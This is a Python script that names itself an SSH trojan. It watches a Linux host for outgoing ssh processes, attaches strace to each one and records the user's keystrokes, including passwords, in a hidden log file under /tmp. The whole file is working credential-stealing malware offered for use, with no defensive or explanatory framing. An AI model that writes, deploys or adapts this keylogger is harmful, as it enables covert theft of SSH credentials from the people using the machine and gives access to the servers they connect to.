import subprocess
from subprocess import Popen, PIPE
from time import sleep
import threading
import re
import logging

SSHPROCS = []
# Path log file
LOG_FILE = "/tmp/.log_sshtrojan2.txt"
# How often to look for new processes
CHECKEVERY = 2 # 2 sec

class Process(object):
    """Parses out the process list."""
    def __init__(self, proc_info):
        self.user  = proc_info[0]
        self.pid   = proc_info[1]
        self.comm   = proc_info[2]
        self.host  = proc_info[3]

    def notify_ssh(self):
        return f"New Outgoing connection from {self.user} to {self.host} with the PID {self.pid}"

def get_ps():
    """Retreives information from ps."""
    proc_list = []
    result = subprocess.run(["ps axo user,pid,command | grep ssh"], shell=True, capture_output=True, text=True)
    tmp = result.stdout.split("\n")
    for line in tmp:
        if line == '':
            break
        proc_info = line.split()
        if proc_info[2] == "ssh":
            proc_list.append(Process(proc_info))
    return proc_list

def keylogger_ssh(proc):
    """Keylogger for ssh."""
    # Open SSH process using strace
    logger = Popen(['strace', '-p', proc.pid, "-e", "read,write"], shell=False, stdout=PIPE, stderr=PIPE, text=True)
    logging.info(f"Host: {proc.host}")
    
    while True:
        # Check to see if strace has closed
        logger.poll()
        # Read output from strace
        output = logger.stderr.readline()
        #  Close log file if strace has ended
        if not output and logger.returncode is not None:
            print(f"Connection closed from {proc.host} PID {proc.pid}")
            logging.info(f"Connection closed from {proc.host} PID {proc.pid}")
            SSHPROCS.remove(proc.pid)
            break
        # Only log the user's input
        if "read(4" in output and ", 1)" in output and "= 1" in output:
            keystroke = re.sub(r'read\(.*, "(.*)", 1\).*= 1', r'\1', output)
            # Strip new linesps
            keystroke = keystroke.rstrip('\n')
            logging.debug(f"Password: {keystroke}")

def check_ps():
    """Checks to see if any new ssh processes are running."""
    pslist = get_ps()
    for proc in pslist:
        # Check to see if SSH process is already monitored
        if proc.pid not in SSHPROCS:
            SSHPROCS.append(proc.pid)
            print(proc.notify_ssh())
            tssh = threading.Thread(target=keylogger_ssh, args=[proc])
            tssh.start()

if __name__ == "__main__":
    logging.basicConfig(
        filename=LOG_FILE,
        filemode='a',
        format='%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%d-%m-%y %H:%M:%S',
        level=logging.DEBUG)
    print ("Logging SSH processes\n")
    # Check for new processes
    while True:
        check_ps()
        sleep(CHECKEVERY)